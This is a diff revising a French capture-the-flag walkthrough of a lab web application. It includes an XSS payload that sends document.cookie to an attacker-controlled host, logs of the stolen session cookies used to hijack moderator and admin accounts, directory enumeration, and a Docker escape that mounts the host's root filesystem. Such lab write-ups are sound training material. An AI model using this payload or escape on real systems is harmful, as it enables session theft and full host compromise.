@@ -36,23 +36,29 @@ Nous avons donc une application web et un service SSH : concentrons nous sur l'a
 
 ### Compromission du modérateur
 
-Nous avons le choix entre un formulaire de contact et un formulaire de connexion, nous allons commencer par essayer de voir s'il est possible de voluer le cookie d'un modérateur ou d'un adminsitrateur :
+L'interface web nous montre : 
+- Un formulaire de contact
+- Une page de connexion
+
+nous allons commencer par essayer de voler le cookie d'un modérateur ou d'un adminsitrateur :
 
 ```bash
 <script>document.location='http://10.81.76.213:8888/XSS/grabber.php?c='+document.cookie</script>
 ```
 
-après quelques secondes on a : 
+après quelques secondes on a une connexion sur notre serveur : 
 
 ```
 root@ip-10-81-76-213:~/workspace# python3 -m http.server 8888
 Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
-10.81.76.213 - - [19/Jan/2026 18:50:42] "GET /?c=PHPSESSID=oksnp5a62vr82oh5qnbq8dl9r1 HTTP/1.1" 404 -
+10.81.76.213 - - [19/Jan/2026 18:50:42] "GET /XSS/grabber.php?c=PHPSESSID=oksnp5a62vr82oh5qnbq8dl9r1 HTTP/1.1" 404 -
 ```
+
+On peut alors utiliser le cookie de MOD pour se connecter et récupérer le premier flag. 
 
 ### Compromission de l'administrateur
 
-On accès alors à plusieurs pages, dont un chat. On observe également que si on clique sur "View Feedback", notre payload xss est exécuté. Nous allons donc envoyer le lien de review à l'admin via le chat : 
+On a alors accès à plusieurs nouvelles pages, dont un chat qui nous permet de contacter l'administrateur. On observe également que si on clique sur "View Feedback", notre payload xss est exécuté. Nous allons donc envoyer le lien de review à l'admin via le chat : 
 
 
 ![pwn admin](../img/sequence_trapadmin.png)
@@ -63,11 +69,11 @@ Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
 10.81.177.118 - - [19/Jan/2026 18:54:53] "GET /XSS/grabber.php?c=PHPSESSID=u48jkin84aeoo85ql0o9dk9ihc HTTP/1.1" 404 -
 ```
 
-On récupère alors le deuxième flag.
+L'admin clique bien sur le lien et on récupère alors le deuxième flag.
 
 ## Reverse Shell
 
-Après cela, on tombe sur un dashboard mais qui n'a pas l'air d'avoir beaucoup de faille et nous allons donc repasser dans une phase d'énumération avec gobuster et nikto : 
+Après cela, nous avons accès à un nouveau dashboard qui inclut un fichier lottery.php. Cependant il n'est pas possible d'exploiter cette inclusion pour inclure des fichiers sensibles. nous allons donc repasser dans une phase d'énumération avec gobuster et nikto : 
 ```bash
 gobuster dir -u http://review.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
 ===============================================================
@@ -202,7 +208,7 @@ php             8.1-cli   0ead645a9bc2   10 months ago   527MB
 
 ```
 
-Nous allons donc créer un nouveau container avec une des images disponibles et cette fois en montant la racine du host dans le dossier mount : `-v /:/mnt`. Une fois cette 
+Nous allons donc créer un nouveau container avec une des images disponibles et cette fois en montant la racine du host dans le dossier mount : `-v /:/mnt`.  
 
 ```bash
 root@4f18a45cca05:/# docker run -v /:/mnt -d d0bf58293d3b tail -f /dev/null
@@ -211,7 +217,7 @@ ae4760cc17fbacd0f1a6758c9b34d9d8b7633c87ddbb88b97bf38413fbacdcc1
 
 ```
 
-Une fois le container créé, on a accès au système de fichier de l’hôte : 
+Une fois le container créé, on a accès au système de fichier de l’hôte et on peut récupérer le dernier flag : 
 
 ```bash
 
